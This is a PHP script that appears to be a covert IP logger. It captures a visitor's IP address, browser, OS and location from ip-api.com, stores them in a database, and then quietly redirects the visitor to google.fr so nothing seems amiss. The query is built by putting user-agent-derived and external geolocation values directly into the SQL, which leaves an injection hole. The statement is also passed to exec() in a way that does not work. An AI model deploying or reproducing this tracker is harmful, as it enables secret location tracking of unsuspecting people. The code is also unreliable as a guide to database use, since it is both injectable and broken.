<?php
//--------------------------------------------------------------------------------------------------
    $ip = $_SERVER['REMOTE_ADDR'];
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $date = date("Y-m-d H:i:s");
    $browser = getBrowser($userAgent);
    $os = getOperatingSystem($userAgent);
    $language = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
    $geoData = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
//--------------------------------------------------------------------------------------------------
    $info = array(
        'ip' => $ip,
        'browser' => $browser,
        'date' => $date,
        'os' => $os,
        'language' => $language,
        'country' => $geoData->country,
        'region' => $geoData->regionName,
        'city' => $geoData->city
    );
//--------------------------------------------------------------------------------------------------    
function getBrowser($userAgent)
    {
        $browser = "Unknown";
        if (preg_match('/MSIE/i', $userAgent) && !preg_match('/Opera/i', $userAgent)) {
            $browser = 'Internet Explorer';
        } elseif (preg_match('/Firefox/i', $userAgent)) {
            $browser = 'Mozilla Firefox';
        } elseif (preg_match('/Chrome/i', $userAgent)) {
            $browser = 'Google Chrome';
        } elseif (preg_match('/Safari/i', $userAgent)) {
            $browser = 'Apple Safari';
        } elseif (preg_match('/Opera/i', $userAgent)) {
            $browser = 'Opera';
        } elseif (preg_match('/Netscape/i', $userAgent)) {
            $browser = 'Netscape';
        }
        return $browser;
    }
//--------------------------------------------------------------------------------------------------
function getOperatingSystem($userAgent)
{
    $os = "Unknown";

    if (preg_match('/win/i', $userAgent)) {
        $os = 'Windows';
    } elseif (preg_match('/mac/i', $userAgent)) {
        $os = 'Mac';
    } elseif (preg_match('/linux/i', $userAgent)) {
        $os = 'Linux';
    } elseif (preg_match('/unix/i', $userAgent)) {
        $os = 'Unix';
    } elseif (preg_match('/android/i', $userAgent)) {
        $os = 'Android';
    } elseif (preg_match('/iphone/i', $userAgent)) {
        $os = 'iPhone';
    }

    return $os;
}
//--------------------------------------------------------------------------------------------------
	$serveur = "//";
	$login = "//";
	$pass = "//";
	$dbname = "//";
	$connection = new PDO("mysql:host=$serveur;dbname=$dbname",$login, $pass);
	$connection -> setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
	$sql = $connection->prepare("INSERT INTO YOUR_TABLE_NAME(ip, browser, os, country, region, city, date) VALUES('$ip','$browser','$os','$geoData->country','$geoData->regionName','$geoData->city', '$date')");
  $connection->exec($sql);
  header('Location: https://www.google.fr/');
  exit();
?>
